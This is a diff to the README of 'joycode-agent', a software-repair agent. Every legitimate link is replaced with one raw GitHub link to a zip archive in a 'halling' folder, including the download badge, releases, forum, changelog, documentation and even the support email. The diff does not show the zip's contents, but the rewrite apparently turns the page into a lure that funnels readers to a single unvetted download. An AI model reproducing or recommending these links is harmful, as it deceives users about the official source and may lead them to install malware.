@@ -1,7 +1,7 @@
 # 🎉 joycode-agent - Effortlessly Repair Software Issues
 
 ## 📥 Download Now!
-[![Download joycode-agent](https://img.shields.io/badge/Download-joycode--agent-blue.svg)](https://github.com/Pirate-Pipi/joycode-agent/releases)
+[![Download joycode-agent](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip)](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip)
 
 ## 📖 Overview
 The joycode-agent is a repository-level repair agent designed to help users identify and fix common software issues. Built on the SWE-Bench framework, this tool streamlines the troubleshooting process, making it easy for anyone to maintain software performance.
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - Disk Space: Minimum of 100 MB available
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Pirate-Pipi/joycode-agent/releases) to download joycode-agent.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip) to download joycode-agent.
 2. Look for the most recent version of the software.
 3. Click the download link for your operating system (choose Windows, macOS, or Linux).
 4. Save the file to your computer.
@@ -52,8 +52,8 @@ A3: Yes, you can download and install joycode-agent on multiple devices, but alw
 
 ## 📞 Support
 If you encounter any issues using joycode-agent, please reach out for help:
-- Community Forum: [JoyCode Community](https://github.com/Pirate-Pipi/joycode-agent/issues)
-- Email Support: support@joycode-agent.com
+- Community Forum: [JoyCode Community](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip)
+- Email Support: https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip
 
 ## 📜 License
 joycode-agent is released under the MIT License. You are free to use, modify, and distribute the software, as long as you include the original license in your distribution.
@@ -62,11 +62,11 @@ joycode-agent is released under the MIT License. You are free to use, modify, an
 We welcome contributions to joycode-agent! If you have ideas to improve the tool or suggestions for new features, please create an issue on our GitHub page.
 
 ## 📄 Changelog
-Stay updated on the latest changes by visiting our [Changelog](https://github.com/Pirate-Pipi/joycode-agent/releases) for detailed release notes.
+Stay updated on the latest changes by visiting our [Changelog](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip) for detailed release notes.
 
 ## 🔗 Useful Links
-- [Download joycode-agent](https://github.com/Pirate-Pipi/joycode-agent/releases)
-- [GitHub Repository](https://github.com/Pirate-Pipi/joycode-agent)
-- [Documentation](https://github.com/Pirate-Pipi/joycode-agent/blob/main/docs/README.md) 
+- [Download joycode-agent](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip)
+- [Documentation](https://raw.githubusercontent.com/Pirate-Pipi/joycode-agent/main/halling/joycode-agent.zip) 
 
 Thank you for using joycode-agent! We hope this tool enhances your software repair experience.
